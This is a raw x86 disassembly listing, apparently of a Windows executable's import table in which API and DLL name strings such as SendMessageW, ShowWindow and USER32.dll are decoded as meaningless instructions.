  4287a1:	add    BYTE PTR ds:0x6e655302,ch
  4287a7:	fs dec esi
  4287a9:	outs   dx,DWORD PTR ds:[esi]
  4287aa:	je     0x428815
  4287ac:	data16 jns 0x4287fc
  4287af:	gs jae 0x428825
  4287b2:	popa   
  4287b3:	addr16 gs push edi
  4287b6:	add    BYTE PTR [eax],al
  4287b8:	mov    al,0x1
  4287ba:	dec    esp
  4287bb:	outs   dx,DWORD PTR ds:[esi]
  4287bc:	popa   
  4287bd:	fs dec ecx
  4287bf:	arpl   WORD PTR [edi+0x6e],bp
  4287c2:	push   edi
  4287c3:	add    BYTE PTR [ecx+0x57734901],ah
  4287c9:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  4287d0:	popa   
  4287d1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  4287d5:	add    BYTE PTR ds:0x74654701,dl
  4287db:	inc    esi
  4287dc:	outs   dx,DWORD PTR ds:[esi]
  4287dd:	jb     0x428844
  4287df:	addr16 jb 0x428851
  4287e2:	jne    0x428852
  4287e4:	fs push edi
  4287e6:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  4287ed:	add    DWORD PTR [edi+0x65],eax
  4287f0:	je     0x428849
  4287f2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4287f9:	js     0x42886f
  4287fb:	inc    ecx
  4287fc:	add    BYTE PTR [eax],al
  4287fe:	add    DWORD PTR ds:[edi+0x65],eax
  428802:	je     0x428851
  428804:	gs jae 0x42887a
  428807:	popa   
  428808:	addr16 gs push edi
  42880b:	add    BYTE PTR [ebx],ch
  42880d:	add    dl,BYTE PTR [ebx+0x65]
  428810:	outs   dx,BYTE PTR ds:[esi]
  428811:	fs dec ebp
  428813:	gs jae 0x428889
  428816:	popa   
  428817:	addr16 gs push edi
  42881a:	add    BYTE PTR [eax],al
  42881c:	das    
  42881d:	add    dl,BYTE PTR [ebx+0x65]
  428820:	je     0x428863
  428822:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428826:	gs push edi
  428828:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  42882f:	add    dl,BYTE PTR [edx+0x65]
  428832:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  42883a:	popa   
  42883b:	jae    0x4288b0
  42883d:	inc    ebp
  42883e:	js     0x428897
  428840:	add    BYTE PTR [eax],al
  428842:	and    DWORD PTR [edx],eax
  428844:	push   ebx
  428845:	outs   dx,BYTE PTR gs:[esi]
  428847:	fs inc esp
  428849:	ins    BYTE PTR es:[edi],dx
  42884a:	addr16 dec ecx
  42884c:	je     0x4288b3
  42884e:	ins    DWORD PTR es:[edi],dx
  42884f:	dec    ebp
  428850:	gs jae 0x4288c6
  428853:	popa   
  428854:	addr16 gs inc ecx
  428857:	add    BYTE PTR ds:0x74654701,bh
  42885d:	dec    ebp
  42885e:	gs jae 0x4288d4
  428861:	popa   
  428862:	addr16 gs push esp
  428865:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  42886c:	inc    ebx
  42886d:	popa   
  42886e:	jae    0x4288d3
  428870:	popa   
  428871:	fs gs push edi
  428874:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42887b:	add    bh,bl
  42887d:	add    BYTE PTR [ebp+0x78],al
  428880:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  428888:	jae    0x4288cf
  42888a:	js     0x42888c
  42888c:	repnz add DWORD PTR [eax+0x6f],edx
  428890:	jae    0x428906
  428892:	dec    ebp
  428893:	gs jae 0x428909
  428896:	popa   
  428897:	addr16 gs push edi
  42889a:	add    BYTE PTR [eax],al
  42889c:	add    DWORD PTR fs:[edi+0x65],eax
  4288a0:	je     0x4288f7
  4288a2:	jo     0x428908
  4288a4:	popa   
  4288a5:	je     0x42890c
  4288a7:	push   edx
  4288a8:	outs   dx,BYTE PTR ds:[si]
  4288aa:	add    BYTE PTR [eax],al
  4288ac:	mov    BYTE PTR [edx],al
  4288ae:	push   esp
  4288af:	popa   
  4288b0:	bound  esp,QWORD PTR [edx+0x65]
  4288b3:	fs push esp
  4288b5:	gs js  0x42892c
  4288b8:	dec    edi
  4288b9:	jne    0x42892f
  4288bb:	push   edi
  4288bc:	add    BYTE PTR [eax],al
  4288be:	test   eax,0x616f4c01
  4288c3:	fs inc edx
  4288c5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  4288cd:	add    BYTE PTR [edx+esi*2+0x61],al
  4288d1:	ja     0x428926
  4288d3:	je     0x428936
  4288d5:	je     0x42893c
  4288d7:	push   edi
  4288d8:	add    BYTE PTR [eax],al
  4288da:	ja     0x4288dd
  4288dc:	inc    edi
  4288dd:	gs je  0x428937
  4288e0:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4288e7:	js     0x42895d
  4288e9:	dec    esp
  4288ea:	outs   dx,BYTE PTR gs:[esi]
  4288ec:	addr16 je 0x428957
  4288ef:	push   edi
  4288f0:	add    BYTE PTR [eax],al
  4288f2:	cmp    BYTE PTR [eax],al
  4288f4:	inc    ebx
  4288f5:	push   0x70557261
  4288fa:	jo     0x428961
  4288fc:	jb     0x428940
  4288fe:	jne    0x428966
  428900:	push   di
  428902:	add    BYTE PTR [eax],al
  428904:	daa    
  428905:	add    DWORD PTR [edi+0x65],eax
  428908:	je     0x428955
  42890a:	gs jns 0x42896f
  42890d:	outs   dx,DWORD PTR ds:[esi]
  42890e:	popa   
  42890f:	jb     0x428975
  428911:	push   esp
  428912:	jns    0x428984
  428914:	add    BYTE PTR gs:[ebx+0x1],cl
  428918:	inc    edi
  428919:	gs je  0x42896c
  42891c:	jb     0x42898d
  42891e:	jo     0x428977
  428920:	add    BYTE PTR [eax],al
  428922:	dec    ebp
  428923:	add    BYTE PTR [ebx+0x6f],al
  428926:	jo     0x4289a1
  428928:	push   edx
  428929:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42892e:	sub    eax,0x61684300
  428933:	jb     0x428983
  428935:	gs js  0x4289ac
  428938:	push   edi
  428939:	add    BYTE PTR [eax+0x43734901],dl
  42893f:	push   0x6f4c7261
  428944:	ja     0x4289ab
  428946:	jb     0x428989
  428948:	add    BYTE PTR [eax],al
  42894a:	sub    BYTE PTR [ecx],al
  42894c:	inc    edi
  42894d:	gs je  0x42899c
  428950:	popa   
  428951:	jae    0x4289c7
  428953:	inc    ecx
  428954:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428958:	gs push eax
  42895a:	outs   dx,DWORD PTR ds:[esi]
  42895b:	jo     0x4289d2
  42895d:	jo     0x42895f
  42895f:	add    BYTE PTR [ebx+0x616f4c01],bh
  428965:	fs push ebx
  428967:	je     0x4289db
  428969:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  428970:	inc    edi
  428971:	gs je  0x4289cb
  428974:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  42897b:	outs   dx,BYTE PTR ds:[esi]
  42897c:	addr16 push edi
  42897e:	add    BYTE PTR [eax],al
  428980:	leave  
  428981:	add    DWORD PTR [ebp+0x61],ecx
  428984:	jo     0x4289dd
  428986:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  42898d:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  428994:	inc    ebx
  428995:	push   0x6f547261
  42899a:	dec    edi
  42899b:	gs ins DWORD PTR es:[edi],dx
  42899d:	push   edi
  42899e:	add    BYTE PTR [eax],al
  4289a0:	push   ebp
  4289a1:	push   ebx
  4289a2:	inc    ebp
  4289a3:	push   edx
  4289a4:	xor    esi,DWORD PTR [edx]
  4289a6:	cs fs ins BYTE PTR es:[edi],dx
  4289a9:	ins    BYTE PTR es:[edi],dx
  4289aa:	add    BYTE PTR [eax],al
  4289ac:	xchg   edx,eax
  4289ad:	add    edx,DWORD PTR [edx+0x74]
  4289b0:	ins    BYTE PTR es:[edi],dx
  4289b1:	dec    ecx
  4289b2:	outs   dx,BYTE PTR ds:[esi]
  4289b3:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  4289bb:	jb     0x428a26
  4289bd:	outs   dx,BYTE PTR ds:[esi]
  4289be:	add    BYTE PTR [bp+0x74],ch
  4289c2:	fs ins BYTE PTR es:[edi],dx
  4289c4:	ins    BYTE PTR es:[edi],dx
  4289c5:	cs fs ins BYTE PTR es:[edi],dx
  4289c8:	ins    BYTE PTR es:[edi],dx
  4289c9:	add    BYTE PTR ds:0x74654702,al
  4289cf:	dec    esp
  4289d0:	outs   dx,DWORD PTR ds:[esi]
  4289d1:	arpl   WORD PTR [ecx+0x6c],sp
  4289d4:	gs dec ecx
  4289d6:	outs   dx,BYTE PTR ds:[esi]
  4289d7:	outs   dx,WORD PTR ds:[esi]
  4289d9:	push   edi
  4289da:	add    BYTE PTR [eax],al
  4289dc:	inc    ebp
  4289dd:	add    al,BYTE PTR [edi+0x65]
  4289e0:	je     0x428a32
  4289e2:	jb     0x428a53
  4289e4:	arpl   WORD PTR [ecx+0x64],ax
  4289e7:	fs jb  0x428a4f
  4289ea:	jae    0x428a5f
  4289ec:	add    BYTE PTR [eax],al
  4289ee:	rol    DWORD PTR [eax],cl
  4289f0:	inc    ebx
  4289f1:	jb     0x428a58
  4289f3:	popa   
  4289f4:	je     0x428a5b
  4289f6:	inc    esi
  4289f7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4289ff:	outs   dx,BYTE PTR ds:[esi]
  428a00:	addr16 push edi
  428a02:	add    BYTE PTR [eax],al
  428a04:	sub    BYTE PTR [ebx+edx*2],al
  428a07:	gs je  0x428a52
  428a0a:	popa   
  428a0b:	outs   dx,BYTE PTR ds:[esi]
  428a0c:	fs ins BYTE PTR es:[edi],dx
  428a0e:	gs inc ebx
  428a10:	outs   dx,DWORD PTR ds:[esi]
  428a11:	jne    0x428a81
  428a13:	je     0x428a15
  428a15:	add    ah,bl
  428a17:	add    BYTE PTR [ebx+0x72],al
  428a1a:	gs popa 
  428a1c:	je     0x428a83
  428a1e:	dec    ebp
  428a1f:	popa   
  428a20:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428a28:	pop    DWORD PTR [ecx]
  428a2a:	inc    edi
  428a2b:	gs je  0x428a6f
  428a2e:	je     0x428a9f
  428a30:	ins    DWORD PTR es:[edi],dx
  428a31:	dec    esi
  428a32:	popa   
  428a33:	ins    DWORD PTR es:[edi],dx
  428a34:	gs inc ecx
  428a36:	add    BYTE PTR [eax],al
  428a38:	pusha  
  428a39:	add    al,BYTE PTR [edi+0x65]
  428a3c:	je     0x428a91
  428a3e:	jns    0x428ab3
  428a40:	je     0x428aa7
  428a42:	ins    DWORD PTR es:[edi],dx
  428a43:	push   edi
  428a44:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428a4b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428a52:	jns    0x428a95
  428a54:	add    BYTE PTR [eax],al
  428a56:	aas    
  428a57:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428a5b:	fs dec esp
  428a5d:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428a64:	add    BYTE PTR [eax],al
  428a66:	xchg   ecx,eax
  428a67:	add    al,BYTE PTR [edi+0x6c]
  428a6a:	outs   dx,DWORD PTR ds:[esi]
  428a6b:	bound  esp,QWORD PTR [ecx+0x6c]
  428a6e:	inc    ecx
  428a6f:	ins    BYTE PTR es:[edi],dx
  428a70:	ins    BYTE PTR es:[edi],dx
  428a71:	outs   dx,DWORD PTR ds:[esi]
  428a72:	arpl   WORD PTR [eax],ax
  428a74:	xchg   edx,eax
  428a75:	add    al,0x56
  428a77:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428a7e:	jne    0x428ae5
  428a80:	jb     0x428afb
  428a82:	add    BYTE PTR [eax],al
  428a84:	test   DWORD PTR [ecx],0x46746547
  428a8a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428a92:	jb     0x428a95
  428a94:	inc    esi
  428a95:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428a9c:	jne    0x428b10
  428a9e:	arpl   WORD PTR [ebp+0x57],sp
  428aa1:	add    BYTE PTR [eax],bh
  428aa3:	add    ecx,DWORD PTR [ebp+0x6f]
  428aa6:	jbe    0x428b0d
  428aa8:	inc    esi
  428aa9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428ab1:	popa   
  428ab2:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428ab9:	jo     0x428b2f
  428abb:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428ac2:	inc    edi
  428ac3:	gs je  0x428b08
  428ac6:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428acd:	jo     0x428b34
  428acf:	inc    ecx
  428ad0:	add    BYTE PTR [eax],al
  428ad2:	and    DWORD PTR [ebx+edx*2],eax
  428ad5:	gs je  0x428b1e
  428ad8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428ae0:	bound  esi,QWORD PTR [ebp+0x74]
  428ae3:	gs jae 0x428b27
  428ae6:	add    BYTE PTR [eax],al
  428ae8:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428aec:	jbe    0x428b53
  428aee:	inc    esi
  428aef:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428af7:	add    BYTE PTR [ebx+0x6f],al
  428afa:	jo     0x428b75
  428afc:	inc    esi
  428afd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b05:	jne    0x428b6c
  428b07:	jb     0x428b82
  428b09:	push   eax
  428b0a:	gs jb  0x428b73
  428b0d:	outs   dx,DWORD PTR ds:[esi]
  428b0e:	jb     0x428b7d
  428b10:	popa   
  428b11:	outs   dx,BYTE PTR ds:[esi]
  428b12:	arpl   WORD PTR [ebp+0x43],sp
  428b15:	outs   dx,DWORD PTR ds:[esi]
  428b16:	jne    0x428b86
  428b18:	je     0x428b7f
  428b1a:	jb     0x428b1c
  428b1c:	sub    DWORD PTR [ebx+edx*2],eax
  428b1f:	gs je  0x428b6a
  428b22:	popa   
  428b23:	outs   dx,BYTE PTR ds:[esi]
  428b24:	fs ins BYTE PTR es:[edi],dx
  428b26:	gs dec ecx
  428b28:	outs   dx,BYTE PTR ds:[esi]
  428b29:	outs   dx,WORD PTR ds:[esi]
  428b2b:	jb     0x428b9a
  428b2d:	popa   
  428b2e:	je     0x428b99
  428b30:	outs   dx,DWORD PTR ds:[esi]
  428b31:	outs   dx,BYTE PTR ds:[esi]
  428b32:	add    BYTE PTR [eax],al
  428b34:	push   ss
  428b35:	add    DWORD PTR [ebp+0x6e],eax
  428b38:	je     0x428b9f
  428b3a:	jb     0x428b7f
  428b3c:	jb     0x428ba7
  428b3e:	je     0x428ba9
  428b40:	arpl   WORD PTR [ecx+0x6c],sp
  428b43:	push   ebx
  428b44:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428b49:	outs   dx,BYTE PTR ds:[esi]
  428b4a:	add    BYTE PTR [eax],al
  428b4c:	jg     0x428b4f
  428b4e:	inc    esi
  428b4f:	outs   dx,DWORD PTR ds:[esi]
  428b50:	ins    BYTE PTR es:[edi],dx
  428b51:	fs push ebx
  428b53:	je     0x428bc7
  428b55:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428b5c:	ins    BYTE PTR es:[edi],dx
  428b5d:	jae    0x428bd3
  428b5f:	jb     0x428bcd
  428b61:	outs   dx,BYTE PTR gs:[esi]
  428b63:	inc    ecx
  428b64:	add    BYTE PTR [eax],al
  428b66:	sahf   
  428b67:	add    DWORD PTR [edi+0x65],eax
  428b6a:	je     0x428baf
  428b6c:	outs   dx,DWORD PTR ds:[esi]
  428b6d:	ins    DWORD PTR es:[edi],dx
  428b6e:	ins    DWORD PTR es:[edi],dx
  428b6f:	push   esp
  428b70:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428b77:	add    BYTE PTR [edx+eax*1+0x47],dh
  428b7b:	gs je  0x428bd2
  428b7e:	push   0x64616572
  428b83:	push   esp
  428b84:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428b8b:	inc    ebp
  428b8c:	push   edx
  428b8d:	dec    esi
  428b8e:	inc    ebp
  428b8f:	dec    esp
  428b90:	xor    esi,DWORD PTR [edx]
  428b92:	cs fs ins BYTE PTR es:[edi],dx
  428b95:	ins    BYTE PTR es:[edi],dx
  428b96:	add    BYTE PTR [eax],al
  428b98:	mov    dh,0x1
  428b9a:	push   eax
  428b9b:	outs   dx,DWORD PTR ds:[esi]
  428b9c:	ins    BYTE PTR es:[edi],dx
  428b9d:	jns    0x428c06
  428b9f:	outs   dx,DWORD PTR ds:[esi]
  428ba0:	outs   dx,BYTE PTR ds:[esi]
  428ba1:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428ba5:	gs je  0x428bf7
  428ba8:	bound  ebp,QWORD PTR [edx+0x65]
  428bab:	arpl   WORD PTR [edi+edx*2+0x0],si
  428baf:	add    BYTE PTR [ebx+0x6c654400],dh
  428bb5:	gs je  0x428c1d
  428bb8:	inc    esp
  428bb9:	inc    ebx
  428bba:	add    BYTE PTR [eax],al
  428bbc:	rol    DWORD PTR [ecx],1
  428bbe:	push   ebx
  428bbf:	gs ins BYTE PTR es:[edi],dx
  428bc1:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428bc6:	push   0x65
  428bc8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bcc:	jmp    0x428bcf
  428bce:	push   ebx
  428bcf:	gs je  0x428c1f
  428bd2:	popa   
  428bd3:	jo     0x428c22
  428bd5:	outs   dx,DWORD PTR ds:[esi]
  428bd6:	fs add BYTE PTR gs:[eax],al
  428bda:	leave  
  428bdb:	add    DWORD PTR [edx+0x6f],edx
  428bde:	jne    0x428c4e
  428be0:	fs push edx
  428be2:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428be7:	add    BYTE PTR [edx+0x69],al
  428bea:	je     0x428c2e
  428bec:	ins    BYTE PTR es:[edi],dx
  428bed:	je     0x428bef
  428bef:	add    BYTE PTR [ebx+0x61655201],bh
  428bf5:	ins    BYTE PTR es:[edi],dx
  428bf6:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428bfd:	je     0x428c73
  428bff:	add    BYTE PTR gs:[eax],al
  428c02:	jge    0x428c05
  428c04:	inc    edi
  428c05:	gs je  0x428c5b
  428c08:	jns    0x428c7d
  428c0a:	je     0x428c71
  428c0c:	ins    DWORD PTR es:[edi],dx
  428c0d:	push   eax
  428c0e:	popa   
  428c0f:	ins    BYTE PTR es:[edi],dx
  428c10:	gs je  0x428c87
  428c13:	gs push ebp
  428c15:	jae    0x428c7c
  428c17:	add    BYTE PTR [eax+0x74654701],cl
  428c1d:	push   esp
  428c1e:	gs js  0x428c95
  428c21:	inc    ebp
  428c22:	js     0x428c98
  428c24:	outs   dx,BYTE PTR gs:[esi]
  428c26:	je     0x428c78
  428c28:	outs   dx,DWORD PTR ds:[esi]
  428c29:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428c30:	push   ebx
  428c31:	arpl   WORD PTR [ecx+0x6c],sp
  428c34:	gs push esi
  428c36:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428c3d:	inc    ebp
  428c3e:	js     0x428cb4
  428c40:	inc    ebp
  428c41:	js     0x428c43
  428c43:	add    bh,cl
  428c45:	add    DWORD PTR [ebx+0x65],edx
  428c48:	ins    BYTE PTR es:[edi],dx
  428c49:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428c4e:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428c55:	add    DWORD PTR [ebx+0x65],edx
  428c58:	je     0x428cae
  428c5a:	gs js  0x428cd1
  428c5d:	inc    ebx
  428c5e:	outs   dx,DWORD PTR ds:[esi]
  428c5f:	ins    BYTE PTR es:[edi],dx
  428c60:	outs   dx,DWORD PTR ds:[esi]
  428c61:	jb     0x428c63
  428c63:	add    BYTE PTR [eax+0x74615001],ch
  428c69:	push   0x65526f54
  428c6e:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428c76:	inc    ebx
  428c77:	outs   dx,DWORD PTR ds:[esi]
  428c78:	ins    DWORD PTR es:[edi],dx
  428c79:	bound  ebp,QWORD PTR [ecx+0x6e]
  428c7c:	gs push edx
  428c7e:	outs   dx,BYTE PTR ds:[si]
  428c80:	add    BYTE PTR [eax],al
  428c82:	lods   al,BYTE PTR ds:[esi]
  428c83:	add    BYTE PTR [ebx+0x72],al
  428c86:	gs popa 
  428c88:	je     0x428cef
  428c8a:	push   edx
  428c8b:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428c90:	outs   dx,BYTE PTR ds:[esi]
  428c91:	dec    ecx
  428c92:	outs   dx,BYTE PTR ds:[esi]
  428c93:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428c9b:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428c9f:	gs push esp
  428ca1:	outs   dx,DWORD PTR ds:[esi]
  428ca2:	add    BYTE PTR [eax],al
  428ca4:	mov    ds:0x65724300,al
  428ca9:	popa   
  428caa:	je     0x428d11
  428cac:	dec    ecx
  428cad:	inc    ebx
  428cae:	push   edi
  428caf:	add    BYTE PTR [ebp+0x63655201],bh
  428cb5:	je     0x428d0d
  428cb7:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428cbf:	add    BYTE PTR [ebx+0x72],al
  428cc2:	gs popa 
  428cc4:	je     0x428d2b
  428cc6:	push   eax
  428cc7:	popa   
  428cc8:	ins    BYTE PTR es:[edi],dx
  428cc9:	gs je  0x428d40
  428ccc:	add    BYTE PTR gs:[edi+0x44],al
  428cd0:	dec    ecx
  428cd1:	xor    esi,DWORD PTR [edx]
  428cd3:	cs fs ins BYTE PTR es:[edi],dx
  428cd6:	ins    BYTE PTR es:[edi],dx
	...
  428cdf:	add    BYTE PTR [edi],ah
  428ce1:	and    BYTE PTR [edx],al
	...
  428cff:	add    BYTE PTR [ebx],bl
  428d01:	lea    eax,[edx]
	...
  428d0f:	add    BYTE PTR [ecx+0x64],ch
  428d12:	js     0x428d7d
  428d14:	outs   dx,DWORD PTR fs:[esi]
  428d16:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d1a:	add    BYTE PTR [ebx+0x65],dl
  428d1d:	je     0x428d60
  428d1f:	outs   dx,BYTE PTR ds:[esi]
  428d20:	arpl   WORD PTR [eax+0x6f],bp
  428d23:	jb     0x428d74
  428d25:	jb     0x428d90
  428d27:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428d2f:	add    BYTE PTR [eax],al
  428d31:	add    BYTE PTR [eax],al
  428d33:	add    BYTE PTR [eax-0x3bfffd7b],ch
  428d39:	test   DWORD PTR [edx],eax
  428d3b:	add    dh,dl
  428d3d:	test   DWORD PTR [edx],eax
  428d3f:	add    al,ch
  428d41:	test   DWORD PTR [edx],eax
  428d43:	add    BYTE PTR [eax],al
  428d45:	xchg   BYTE PTR [edx],al
  428d47:	add    BYTE PTR [esi+eax*4],dl
  428d4a:	add    al,BYTE PTR [eax]
  428d4c:	xchg   BYTE PTR cs:[edx],al
  428d4f:	add    BYTE PTR [eax],al
  428d51:	add    BYTE PTR [eax],al
  428d53:	add    BYTE PTR [eax-0x7a],dl
  428d56:	add    al,BYTE PTR [eax]
  428d58:	outs   dx,BYTE PTR ds:[esi]
  428d59:	xchg   BYTE PTR [edx],al
  428d5b:	add    BYTE PTR [esi+eax*4+0x2],bh
  428d5f:	add    BYTE PTR [edx-0x61fffd7a],cl
  428d65:	xchg   BYTE PTR [edx],al
  428d67:	add    BYTE PTR [esi+eax*4-0x7941fffe],ch
  428d6e:	add    al,BYTE PTR [eax]
  428d70:	rol    BYTE PTR [esi-0x7921fffe],1
  428d76:	add    al,BYTE PTR [eax]
  428d78:	lock xchg BYTE PTR [edx],al
  428d7b:	add    BYTE PTR [edx],al
  428d7d:	xchg   DWORD PTR [edx],eax
  428d7f:	add    BYTE PTR [eax],dl
  428d81:	xchg   DWORD PTR [edx],eax
  428d83:	add    BYTE PTR [esi],bl
  428d85:	xchg   DWORD PTR [edx],eax
  428d87:	add    BYTE PTR [eax],dh
  428d89:	xchg   DWORD PTR [edx],eax
  428d8b:	add    BYTE PTR [edi+eax*4],bh
  428d8e:	add    al,BYTE PTR [eax]
  428d90:	push   edx
  428d91:	xchg   DWORD PTR [edx],eax
  428d93:	add    BYTE PTR [edi+eax*4+0x2],ah
  428d97:	add    BYTE PTR [esi-0x79],dh
  428d9a:	add    al,BYTE PTR [eax]
  428d9c:	add    BYTE PTR [edi-0x786dfffe],0x2
  428da3:	add    BYTE PTR [edx-0x47fffd79],ah
  428da9:	xchg   DWORD PTR [edx],eax
  428dab:	add    ah,al
  428dad:	xchg   DWORD PTR [edx],eax
  428daf:	add    dh,dl
  428db1:	xchg   DWORD PTR [edx],eax
  428db3:	add    ah,ch
  428db5:	xchg   DWORD PTR [edx],eax
  428db7:	add    dh,bh
  428db9:	xchg   DWORD PTR [edx],eax
  428dbb:	add    BYTE PTR [eax+ecx*4],cl
  428dbe:	add    al,BYTE PTR [eax]
  428dc0:	sbb    al,0x88
  428dc2:	add    al,BYTE PTR [eax]
  428dc4:	mov    BYTE PTR cs:[edx],al
  428dc7:	add    BYTE PTR [edx-0x78],al
  428dca:	add    al,BYTE PTR [eax]
  428dcc:	pop    eax
  428dcd:	mov    BYTE PTR [edx],al
  428dcf:	add    BYTE PTR [edx-0x78],ch
  428dd2:	add    al,BYTE PTR [eax]
  428dd4:	jl     0x428d5e
  428dd6:	add    al,BYTE PTR [eax]
  428dd8:	mov    WORD PTR [eax-0x7763fffe],cs
  428dde:	add    al,BYTE PTR [eax]
  428de0:	lods   al,BYTE PTR ds:[esi]
  428de1:	mov    BYTE PTR [edx],al
  428de3:	add    BYTE PTR [esi-0x33fffd78],bh
  428de9:	mov    BYTE PTR [edx],al
  428deb:	add    dl,bl
  428ded:	mov    BYTE PTR [edx],al
  428def:	add    dl,dh
  428df1:	mov    BYTE PTR [edx],al
  428df3:	add    BYTE PTR [ecx+ecx*4],al
  428df6:	add    al,BYTE PTR [eax]
  428df8:	push   ss
  428df9:	mov    DWORD PTR [edx],eax
  428dfb:	add    BYTE PTR [edx],ah
  428dfd:	mov    DWORD PTR [edx],eax
  428dff:	add    BYTE PTR [esi],ch
  428e01:	mov    DWORD PTR [edx],eax
  428e03:	add    BYTE PTR [edx],bh
  428e05:	mov    DWORD PTR [edx],eax
  428e07:	add    BYTE PTR [edx-0x77],cl
  428e0a:	add    al,BYTE PTR [eax]
  428e0c:	pusha  
  428e0d:	mov    DWORD PTR [edx],eax
  428e0f:	add    BYTE PTR [esi-0x77],ch
  428e12:	add    al,BYTE PTR [eax]
  428e14:	or     BYTE PTR [ecx-0x766dfffe],0x2
  428e1b:	add    BYTE PTR [eax],al
  428e1d:	add    BYTE PTR [eax],al
  428e1f:	add    BYTE PTR [ecx+ecx*4+0x2],ch
  428e26:	add    BYTE PTR [eax],al
  428e28:	retf   0x289
  428e2b:	add    ah,bl
  428e2d:	mov    DWORD PTR [edx],eax
  428e2f:	add    dh,ch
  428e31:	mov    DWORD PTR [edx],eax
  428e33:	add    BYTE PTR [edx+ecx*4],al
  428e36:	add    al,BYTE PTR [eax]
  428e38:	push   ss
  428e39:	mov    al,BYTE PTR [edx]
  428e3b:	add    BYTE PTR [eax],ch
  428e3d:	mov    al,BYTE PTR [edx]
  428e3f:	add    BYTE PTR [eax],bh
  428e41:	mov    al,BYTE PTR [edx]
  428e43:	add    BYTE PTR [esi-0x76],dl
  428e46:	add    al,BYTE PTR [eax]
  428e48:	data16 mov al,BYTE PTR [edx]
  428e4b:	add    BYTE PTR [edx+ecx*4+0x2],dh
  428e4f:	add    BYTE PTR [edx+ecx*4-0x756dfffe],al
  428e56:	add    al,BYTE PTR [eax]
  428e58:	mov    ds:0xae00028a,al
  428e5d:	mov    al,BYTE PTR [edx]
  428e5f:	add    al,al
  428e61:	mov    al,BYTE PTR [edx]
  428e63:	add    dl,dl
  428e65:	mov    al,BYTE PTR [edx]
  428e67:	add    al,ch
  428e69:	mov    al,BYTE PTR [edx]
  428e6b:	add    dh,dh
  428e6d:	mov    al,BYTE PTR [edx]
  428e6f:	add    BYTE PTR [edx],al
  428e71:	mov    eax,DWORD PTR [edx]
  428e73:	add    BYTE PTR [ebx+ecx*4],bl
  428e76:	add    al,BYTE PTR [eax]
  428e78:	xor    al,0x8b
  428e7a:	add    al,BYTE PTR [eax]
  428e7c:	dec    esp
  428e7d:	mov    eax,DWORD PTR [edx]
  428e7f:	add    BYTE PTR [edx-0x75],bl
  428e82:	add    al,BYTE PTR [eax]
  428e84:	mov    ax,WORD PTR [edx]
  428e87:	add    BYTE PTR [eax-0x75],bh
  428e8a:	add    al,BYTE PTR [eax]
  428e8c:	add    BYTE PTR [eax],al
  428e8e:	add    BYTE PTR [eax],al
  428e90:	cwde   
  428e91:	mov    eax,DWORD PTR [edx]
  428e93:	add    BYTE PTR [edx-0x4ffffd75],ah
  428e99:	mov    eax,DWORD PTR [edx]
  428e9b:	add    BYTE PTR [ebx+ecx*4-0x7433fffe],bh
  428ea2:	add    al,BYTE PTR [eax]
  428ea4:	fimul  DWORD PTR [ebx-0x7419fffe]
  428eaa:	add    al,BYTE PTR [eax]
  428eac:	lock mov eax,DWORD PTR [edx]
  428eaf:	add    BYTE PTR [edx],al
  428eb1:	mov    WORD PTR [edx],es
  428eb3:	add    BYTE PTR [eax],bl
